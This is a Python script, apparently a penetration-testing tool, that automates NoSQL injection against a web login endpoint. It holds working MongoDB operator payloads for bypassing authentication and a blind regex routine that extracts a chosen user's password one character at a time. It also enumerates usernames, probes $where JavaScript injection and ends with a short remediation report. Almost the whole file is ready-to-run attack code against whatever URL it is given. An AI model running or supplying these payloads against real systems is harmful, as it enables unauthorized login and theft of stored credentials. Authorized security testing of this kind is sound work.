#!/usr/bin/env python3
"""
NoSQL Injection Testing Automation
Performs operator injection, authentication bypass, and blind data extraction.
"""

import requests
import string
import json
import sys
import time
from urllib.parse import urljoin


def test_operator_injection(target_url: str, content_type: str = "json") -> dict:
    """Test for basic NoSQL operator injection vulnerabilities."""
    results = {"vulnerable": False, "payloads": []}

    payloads = [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$exists": True}, "password": {"$exists": True}},
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": "admin", "password": {"$regex": ".*"}},
    ]

    for payload in payloads:
        try:
            response = requests.post(
                target_url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10,
                allow_redirects=False
            )

            if response.status_code in [200, 302] and (
                "dashboard" in response.text.lower() or
                "welcome" in response.text.lower() or
                "token" in response.text.lower() or
                response.status_code == 302
            ):
                results["vulnerable"] = True
                results["payloads"].append({
                    "payload": json.dumps(payload, default=str),
                    "status_code": response.status_code,
                    "response_length": len(response.text)
                })
                print(f"[+] AUTH BYPASS: {json.dumps(payload, default=str)}")
        except requests.RequestException as e:
            print(f"[-] Request failed: {e}")

    return results


def blind_extract_field(target_url: str, username: str, field: str = "password",
                        max_length: int = 32) -> str:
    """Extract a field value character by character using regex-based blind injection."""
    extracted = ""
    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*"

    print(f"[*] Extracting {field} for user '{username}'...")

    for position in range(max_length):
        found = False
        for char in charset:
            test_value = extracted + char
            payload = {
                "username": username,
                field: {"$regex": f"^{_escape_regex(test_value)}"}
            }

            try:
                response = requests.post(
                    target_url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                    allow_redirects=False
                )

                if response.status_code in [200, 302] and (
                    "dashboard" in response.text.lower() or
                    "welcome" in response.text.lower() or
                    "token" in response.text.lower() or
                    response.status_code == 302
                ):
                    extracted += char
                    print(f"[+] Found character {position}: '{char}' -> {extracted}")
                    found = True
                    break
            except requests.RequestException:
                continue

            time.sleep(0.05)

        if not found:
            break

    print(f"[+] Extracted value: {extracted}")
    return extracted


def _escape_regex(text: str) -> str:
    """Escape special regex characters in extracted text."""
    special_chars = r"\.+*?^${}()|[]"
    result = ""
    for char in text:
        if char in special_chars:
            result += "\\" + char
        else:
            result += char
    return result


def enumerate_usernames(target_url: str) -> list:
    """Enumerate valid usernames using regex injection."""
    found_users = []
    prefixes = list(string.ascii_lowercase)

    print("[*] Enumerating usernames...")
    for prefix in prefixes:
        payload = {
            "username": {"$regex": f"^{prefix}"},
            "password": {"$ne": ""}
        }
        try:
            response = requests.post(
                target_url, json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10, allow_redirects=False
            )
            if response.status_code in [200, 302]:
                print(f"[+] Username starting with '{prefix}' exists")
                found_users.append(prefix)
        except requests.RequestException:
            continue

    return found_users


def test_where_injection(target_url: str) -> bool:
    """Test for JavaScript injection via $where operator."""
    payloads = [
        {"$where": "1==1"},
        {"$where": "this.username == this.username"},
        {"$where": "function() { return true; }"},
    ]

    for payload in payloads:
        try:
            response = requests.post(
                target_url, json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            if response.status_code == 200 and len(response.text) > 100:
                print(f"[+] $where injection works: {json.dumps(payload)}")
                return True
        except requests.RequestException:
            continue

    return False


def generate_report(target_url: str, injection_results: dict,
                    extracted_data: dict, output_file: str):
    """Generate assessment report."""
    with open(output_file, "w") as f:
        f.write("# NoSQL Injection Assessment Report\n\n")
        f.write(f"**Target**: {target_url}\n")
        f.write(f"**Vulnerable**: {'Yes' if injection_results['vulnerable'] else 'No'}\n\n")

        if injection_results["payloads"]:
            f.write("## Successful Payloads\n\n")
            f.write("| Payload | Status Code | Response Length |\n")
            f.write("|---------|-------------|----------------|\n")
            for p in injection_results["payloads"]:
                f.write(f"| `{p['payload']}` | {p['status_code']} | {p['response_length']} |\n")

        if extracted_data:
            f.write("\n## Extracted Data\n\n")
            for user, value in extracted_data.items():
                f.write(f"- **{user}**: `{value}`\n")

        f.write("\n## Remediation\n")
        f.write("- Use parameterized queries and input type validation\n")
        f.write("- Reject object/array inputs where strings are expected\n")
        f.write("- Disable $where JavaScript execution in MongoDB configuration\n")
        f.write("- Implement WAF rules to block MongoDB operator patterns\n")

    print(f"[+] Report saved to {output_file}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python process.py <target_url> [--extract <username>] [--enumerate]")
        sys.exit(1)

    target_url = sys.argv[1]

    print(f"[*] Testing NoSQL injection on {target_url}")
    results = test_operator_injection(target_url)

    extracted_data = {}
    if "--extract" in sys.argv:
        idx = sys.argv.index("--extract")
        username = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else "admin"
        password = blind_extract_field(target_url, username)
        extracted_data[username] = password

    if "--enumerate" in sys.argv:
        enumerate_usernames(target_url)

    test_where_injection(target_url)

    generate_report(target_url, results, extracted_data, "nosql_injection_report.md")


if __name__ == "__main__":
    main()
